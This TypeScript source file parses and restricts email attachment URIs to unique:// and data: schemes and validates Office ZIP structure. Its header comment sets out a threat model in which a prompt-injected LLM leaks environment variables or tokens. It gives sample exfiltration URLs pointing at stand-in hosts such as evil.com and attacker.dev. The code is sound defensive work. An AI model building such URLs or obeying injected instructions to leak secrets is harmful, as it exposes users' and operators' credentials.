// Arbitrary external URLs are intentionally not supported.
// Fetching user-supplied URLs server-side would expose the service to SSRF attacks:
// an attacker (or a prompt-injected LLM) could target internal infrastructure
// (metadata servers, cluster-internal services, etc.) by supplying a crafted URL.
//
// Data exfiltration via attachments is another risk: a prompt-injected LLM could
// encode sensitive data (environment variables, database credentials, internal API
// responses, chat history) into the attachment URI itself — for example:
//   - `https://evil.com/collect?secret=<base64-encoded-env-vars>`
//   - `https://attacker.dev/exfil/<jwt-token-from-memory>`
//   - A `data:` URI converted to a file and sent as an email attachment containing
//     scraped internal data
// By restricting to `unique://` and `data:` schemes, outbound fetches to attacker-
// controlled servers are prevented, closing this exfiltration channel.
//
// Use `unique://` for Unique knowledge-base files or `data:` for inline content instead.
export type ParsedUri =
  | { type: 'unique'; contentId: string }
  | { type: 'data'; mimeType: string; data: Buffer };

const UNIQUE_URI_PATTERN = /^unique:\/\/content\/([^/]+)$/;
const DATA_URI_PATTERN = /^data:([^;,]*)(;base64)?,(.*)$/s;
const ZIP_LOCAL_HEADER_SIGNATURE = 0x04034b50;
const ZIP_EOCD_SIGNATURE = 0x06054b50;
const ZIP_EOCD_SIZE = 22;
const ZIP_MAX_COMMENT_LENGTH = 0xffff;
const ZIP64_MARKER = 0xffffffff;
const TRUNCATED_ATTACHMENT_MESSAGE = 'Attachment data is truncated and cannot be opened';

const OOXML_MIME_TYPES = new Set([
  'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
  'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
  'application/vnd.openxmlformats-officedocument.presentationml.presentation',
]);

export function parseAttachmentUri(uri: string): ParsedUri {
  const uniqueMatch = uri.match(UNIQUE_URI_PATTERN);
  if (uniqueMatch) {
    const contentId = uniqueMatch[1];
    return { type: 'unique', contentId: contentId ?? '' };
  }

  const dataMatch = uri.match(DATA_URI_PATTERN);
  const rawData = dataMatch?.[3];
  if (dataMatch && rawData) {
    const mimeType = dataMatch[1] || 'application/octet-stream';
    const isBase64 = dataMatch[2] === ';base64';
    const data = isBase64
      ? decodeBase64Attachment(rawData)
      : Buffer.from(decodeURIComponent(rawData));

    if (isBase64 && shouldCheckZipStructure(mimeType, data)) {
      assertOfficeZipIsComplete(data);
    }

    return { type: 'data', mimeType, data };
  }

  throw new Error(`Unsupported attachment URI scheme: ${uri.slice(0, 30)}`);
}

function shouldCheckZipStructure(mimeType: string, data: Buffer): boolean {
  if (OOXML_MIME_TYPES.has(mimeType.toLowerCase())) {
    return true;
  }
  return data.length >= 4 && data.readUInt32LE(0) === ZIP_LOCAL_HEADER_SIGNATURE;
}

// TypeScript 5.9 does not declare Uint8Array.fromBase64, which Node 26 provides.
interface Uint8ArrayFromBase64 extends Uint8ArrayConstructor {
  fromBase64(input: string): Uint8Array;
}

function decodeBase64Attachment(rawData: string): Buffer {
  try {
    const bytes = (Uint8Array as Uint8ArrayFromBase64).fromBase64(rawData);
    return Buffer.from(bytes);
  } catch {
    throw new Error(TRUNCATED_ATTACHMENT_MESSAGE);
  }
}

function assertOfficeZipIsComplete(data: Buffer): void {
  const eocdOffset = findZipEocdOffset(data);
  if (eocdOffset === undefined) {
    throw new Error('Attachment is not a valid Office file and cannot be opened');
  }

  const centralDirectorySize = data.readUInt32LE(eocdOffset + 12);
  const centralDirectoryOffset = data.readUInt32LE(eocdOffset + 16);
  // ZIP64 archives are not checked: the real offset lives in a locator this parser does not read.
  if (centralDirectoryOffset === ZIP64_MARKER || centralDirectorySize === ZIP64_MARKER) {
    return;
  }

  const centralDirectoryEnd = centralDirectoryOffset + centralDirectorySize;
  if (
    centralDirectoryOffset > eocdOffset ||
    centralDirectorySize > eocdOffset ||
    centralDirectoryEnd > eocdOffset
  ) {
    throw new Error(TRUNCATED_ATTACHMENT_MESSAGE);
  }
}

function findZipEocdOffset(data: Buffer): number | undefined {
  if (data.length < ZIP_EOCD_SIZE) {
    return undefined;
  }

  const earliest = Math.max(0, data.length - ZIP_EOCD_SIZE - ZIP_MAX_COMMENT_LENGTH);
  for (let offset = data.length - ZIP_EOCD_SIZE; offset >= earliest; offset -= 1) {
    if (data.readUInt32LE(offset) !== ZIP_EOCD_SIGNATURE) {
      continue;
    }
    const commentLength = data.readUInt16LE(offset + 20);
    if (offset + ZIP_EOCD_SIZE + commentLength === data.length) {
      return offset;
    }
  }

  return undefined;
}
